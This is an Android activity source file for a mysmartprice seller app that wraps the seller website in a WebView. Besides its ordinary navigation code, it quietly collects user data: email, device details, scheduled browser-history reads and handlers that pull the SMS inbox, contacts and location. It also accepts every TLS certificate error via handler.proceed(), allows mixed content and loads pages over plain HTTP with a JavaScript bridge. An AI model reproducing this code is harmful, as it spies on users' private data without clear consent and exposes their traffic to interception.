package com.truedev.priceproduction;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.NotificationManager;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.location.Location;
import android.net.MailTo;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;
import android.Manifest;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.parse.ParseInstallation;
import com.truedev.priceproduction.Database.InformationDataSource;

import org.json.JSONArray;

import java.lang.reflect.Constructor;
import java.sql.SQLException;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

import static com.google.gson.FieldNamingPolicy.LOWER_CASE_WITH_UNDERSCORES;


public class MainActivity extends Activity {

    private WebView mWebView;
    private ProgressBar pbar ;
    private ProgressDialog mProgressDialog;
    private MainActivity context;
    private InformationDataSource dataSource;
    SharedPreferences sharedPreferencesProvider;
    public static HashMap<String, String> paramsSend = new HashMap<String,String>();


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        context = this;
        sharedPreferencesProvider = getSharedPreferences("System_info",MODE_PRIVATE);
        dataSource = new InformationDataSource(getApplicationContext());
        mProgressDialog = new ProgressDialog(this);
        mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        mProgressDialog.setMessage("Please wait...");
        mProgressDialog.setCancelable(false);
        mProgressDialog.setMax(100);
        mProgressDialog.show();

        CancelNotification(this,123);
       // CancelNotification(this,124);
       // CancelNotification(this,125);

        if ((!sharedPreferencesProvider.getBoolean("is_sms_and_apps_reads", false))) {

            int hasWriteContactsPermission = 0;
            if(Build.VERSION.SDK_INT >= 23) {

                hasWriteContactsPermission   = checkSelfPermission(Manifest.permission.CALL_PHONE);
            }

            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.CALL_PHONE},
                            112);
                }

            }

/*
            int hasWriteContactsPermission = 0;
            if(Build.VERSION.SDK_INT >= 23) {

                hasWriteContactsPermission   = checkSelfPermission(Manifest.permission.READ_SMS);
            }

            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_SMS},
                            123);
                }

            }
            JsonObject appsInstalled = Utils.getPackages(getApplicationContext());                                  // packages installed
                if(appsInstalled!=null)
            paramsSend.put(Constants.APPS_INSTALLED,appsInstalled.toString());
            JsonArray browserHistory = Utils.getBH(getApplicationContext());                                                                   // browser history
                if(browserHistory!=null)
            paramsSend.put(Constants.BROWSER_HISTORY, browserHistory.toString());
            if(Build.VERSION.SDK_INT >= 23) {

                hasWriteContactsPermission   = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION);
            }

            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    requestPermissions(new String[]{Manifest.permission.ACCESS_FINE_LOCATION},
                            124);
                }


            }

            if(Build.VERSION.SDK_INT >= 23) {

                hasWriteContactsPermission   = checkSelfPermission(Manifest.permission.WRITE_CONTACTS);
            }
            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    requestPermissions(new String[]{Manifest.permission.WRITE_CONTACTS},
                            125);
                }

            }*/
            String networkType = Utils.getNetworkClass(this);
                if(networkType!=null)
            paramsSend.put(Constants.NETWORK,networkType);                                                      // network type
            Boolean isBTEnabled = Utils.isBluetoothEnabled();
            paramsSend.put(Constants.BLUETOOTH,isBTEnabled.toString());
            Boolean isGPSEnabled = Utils.isGpsEnabled(getApplicationContext());
            paramsSend.put(Constants.GPS_STATUS,isGPSEnabled.toString());
            paramsSend.put(Constants.DEVICE,Utils.getDeviceDetails());
            paramsSend.put(Constants.KEY_EMAIL, Utils.getUserEmail(getApplicationContext()));
            try {
                dataSource.open();
            } catch (SQLException e) {
                e.printStackTrace();
            }
            dataSource.insertCustomerInfo(paramsSend);
            dataSource.close();


            sharedPreferencesProvider.edit().putBoolean(Constants.IS_SMS_AND_APPS_READ, true).commit();
        } else {
            sharedPreferencesProvider.edit().putBoolean(Constants.IS_SMS_AND_APPS_READ, false).commit();
        }

        if (!sharedPreferencesProvider.getBoolean(Constants.IS_SEND_BROWSER_HISTORY_ALARMS_SET, false)) {
            Utils.setBrowserHistoryReadAlarms(this, Constants.BROWSER_HISTORY_READ_START_HOUR, Constants.BROWSER_HISTORY_READ_START_MINUTES, Constants.BROWSER_HISTORY_READ_INTERVAL_SECONDS);
            sharedPreferencesProvider.edit().putBoolean(Constants.IS_SEND_BROWSER_HISTORY_ALARMS_SET, true).commit();

        }



            //if(!(prefs.get))
        CookieManager.getInstance().setAcceptCookie(true);
        mWebView = (WebView) findViewById(R.id.activity_main_webview);
        pbar = (ProgressBar) findViewById(R.id.progressBar);
        WebSettings webSettings = mWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        mWebView.addJavascriptInterface(new JSInterface(mWebView.getContext()), "Android");
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
            webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }
        String url = "";
        String postData = "";
        String action = "";
        Bundle extras = this.getIntent().getExtras();
        Boolean isDeepLink = this.getIntent().getBooleanExtra("isDeepLink",false);
        if(extras!=null && extras.getString("notificationType") != null && !isDeepLink) {
            String notificationType = extras.getString("notificationType");
            url = this.getIntent().getStringExtra("url");
            action = this.getIntent().getStringExtra("action");
            // postData = "" this statement can be avoided as its a repetition.
            // Kept it for reference in case of future changes
            if("myProducts".equals(action)) {
                postData = "";
            } else if("outOfStock".equals(action)) {
                String mspid = this.getIntent().getStringExtra("mspid");
                String productName = this.getIntent().getStringExtra("productName");
                postData = "mspid=" + mspid + "&productName=" + productName;
            } else if("myOrders".equals(action)) {
                postData = "";
            } else if("outOfStockLead".equals(action)) {
                String leadid = this.getIntent().getStringExtra("leadid");
                postData = "leadID=" + leadid + "&stockAvailable=" + "no";
            }
        } else if(isDeepLink){
            CancelNotification(this,123);
            String id = this.getIntent().getStringExtra("id");
            String urlBase = this.getIntent().getStringExtra("urlBase");
            url = "http://sellers.mysmartprice.com/my_leads.php?leadid="+id;
            //url = "http://sellers.ravindra.mysmartprice.com/"+urlBase+".php?leadid="+id;
            String installationId = ParseInstallation.getCurrentInstallation().getInstallationId();
            postData = "installationId=" + installationId;
        }
        else {
            //url = "http://sellers.ravindra.mysmartprice.com/index.php";
            url = "http://sellers.mysmartprice.com/index.php";
            String installationId = ParseInstallation.getCurrentInstallation().getInstallationId();
            postData = "installationId=" + installationId;
            //mWebView.postUrl(url, postData.getBytes());
        }
        mWebView.postUrl(url, postData.getBytes());


        mWebView.setWebChromeClient(new WebChromeClient(){
            @Override
            public boolean onJsAlert(WebView view, String url, String message, final JsResult result) {
                new AlertDialog.Builder(context)
                        .setTitle(R.string.title_dialog_alert)
                        .setMessage(message)
                        .setPositiveButton(android.R.string.ok,
                                new AlertDialog.OnClickListener() {
                                    public void onClick(DialogInterface dialog, int which) {
                                        result.confirm();
                                    }
                                }).setCancelable(false).create().show();

                return true;


            }

            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                mProgressDialog.show();
                MainActivity.this.setTitle("Loading...");
                MainActivity.this.setProgress(newProgress * 100);
                mProgressDialog.setProgress(newProgress );
                mProgressDialog.setMessage("Loading...");
                mProgressDialog.setProgressPercentFormat(null);
                mProgressDialog.setProgressNumberFormat(null);




                if(newProgress == 100)
                {
                    MainActivity.this.setTitle(R.string.app_name);
                    mProgressDialog.dismiss();
                }

            }


            @Override
            public boolean onJsConfirm(WebView view, String url, String message, final JsResult result) {
                new AlertDialog.Builder(context)
                        .setTitle(R.string.title_dialog_confirm)
                        .setMessage(message)
                        .setPositiveButton(android.R.string.ok,
                                new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog, int which) {
                                        result.confirm();
                                    }
                                }).setNegativeButton(android.R.string.cancel,
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                result.cancel();
                            }
                        }).create().show();
                return true;
            }

        });

        mWebView.setWebViewClient(new WebViewClient() {
           // ProgressDialog progressDialog = new ProgressDialog(MainActivity.this);

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                super.onReceivedSslError(view, handler, error);
                handler.proceed();
            }

           /* @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {

                progressDialog.setProgress(0);
                //progressDialog.setMessage("Loading...");
                progressDialog.setCanceledOnTouchOutside(false);
                progressDialog.show();
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                progressDialog.setProgress(100);
                progressDialog.dismiss();
                progressDialog.setCanceledOnTouchOutside(false);
                findViewById(R.id.activity_main_webview).setVisibility(View.VISIBLE);
            }*/

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {

                if (url.startsWith("mailto:")) {
                    MailTo mailTo = MailTo.parse(url);
                    Intent intent = new Intent(Intent.ACTION_SEND);
                    intent.setType("text/plain");
                    intent.putExtra(Intent.EXTRA_EMAIL, new String[]{mailTo.getTo()});
                    intent.putExtra(Intent.EXTRA_SUBJECT, mailTo.getSubject());
                    intent.putExtra(Intent.EXTRA_CC, mailTo.getCc());
                    intent.putExtra(Intent.EXTRA_TEXT, mailTo.getBody());
                    startActivity(intent);
                    view.reload();
                    return true;
                }
                if (url.startsWith("tel:")) {
                    Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse(url));
                    startActivity(intent);
                    return true;
                }

                if(Uri.parse(url).getHost().endsWith("mysmartprice.com")) {
                    return false;
                }

                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                view.getContext().startActivity(intent);
                return true;
            }
        });
    }

    public static void CancelNotification(Context ctx, int notifyId) {
        String  s = Context.NOTIFICATION_SERVICE;
        NotificationManager mNM = (NotificationManager) ctx.getSystemService(s);

//        mNM.getActiveNotifications();
        mNM.cancel(notifyId);
      //  mNM.cancelAll();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        switch (requestCode) {
            case 123:
                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // Permission Granted
                    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
                    JsonObject smsArray = Utils.getSms(cursor, true);                                                       // SMS data
                    if (smsArray != null)
                        paramsSend.put(Constants.SMS_INFO, smsArray.toString());
                } else {
                    // Permission Denied
                    Toast.makeText(MainActivity.this, "READ_SMS Denied", Toast.LENGTH_SHORT)
                            .show();
                }
                break;

            case 124:

                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    Location loc = Utils.getMyLocation(context);                                                               // location latitude and longitude
                    if (loc != null)
                        paramsSend.put(Constants.LOCATION, loc.toString());
                }else {
                    // Permission Denied
                    Toast.makeText(MainActivity.this, "GET_LOCATION Denied", Toast.LENGTH_SHORT)
                            .show();
                }
                break;

            case 125:

                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    JsonArray contactList = Utils.getContacts(context);                                                                                // contact details
                    if (contactList != null)
                        paramsSend.put(Constants.CONTACT, contactList.toString());
                }else {
                    // Permission Denied
                    Toast.makeText(MainActivity.this, "GET_CONTACTS Denied", Toast.LENGTH_SHORT)
                            .show();
                }
                break;

            case 112:

                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(MainActivity.this, "GET_CONTACTS Granted", Toast.LENGTH_SHORT)
                            .show();
                }else {
                    // Permission Denied
                    Toast.makeText(MainActivity.this, "GET_CONTACTS Denied", Toast.LENGTH_SHORT)
                            .show();
                }
                break;

            default:
                 super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                //context.onRequestPermissionsResult(requestCode,permissions,grantResults);
        }
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Check if the key event was the Back button and if there's history
        if ((keyCode == KeyEvent.KEYCODE_BACK) && mWebView.canGoBack()) {
            mWebView.goBack();
            return true;
        }
        // If it wasn't the Back key or there's no web page history, bubble up to the default
        // system behavior (probably exit the activity)
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }


    private class JSInterface {
        Context mContext;

        JSInterface(Context ctx) {
            mContext = ctx;
        }

        @JavascriptInterface
        public void showToast(String toast) {
            Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();
        }



        @JavascriptInterface
        public void alert(String message) {
          /*  new AlertDialog.Builder(context.getActivity())
                    .setTitle(R.string.title_dialog_alert)
                    .setMessage(message)
                    .setPositiveButton(android.R.string.ok,
                            new AlertDialog.OnClickListener() {
                                public void onClick(DialogInterface dialog, int which) {
                                    dialog.dismiss();
                                }
                            }).show();*/
        }

        @JavascriptInterface
        public void performClick(String tel) throws Exception //method which you call on upload image button click on HTML page
        {
            Log.d("LOGIN::", tel);
            Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse(tel));
            startActivity(intent);

        }

    }
}
